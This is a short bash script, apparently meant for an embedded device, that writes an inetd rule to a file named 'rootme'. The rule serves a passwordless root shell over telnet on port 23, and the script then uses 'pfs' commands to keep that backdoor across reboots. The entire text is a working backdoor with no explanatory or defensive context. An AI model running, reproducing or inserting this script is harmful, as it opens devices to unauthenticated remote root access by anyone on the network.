#!/bin/bash
echo "23telnet stream tcp nowait root /usr/sbin/telnetd telnetd -i -l /bin/sh" > /var/etc/inetd.d/rootme
pfs -a /var/etc/inetd.d/rootme
pfs -s
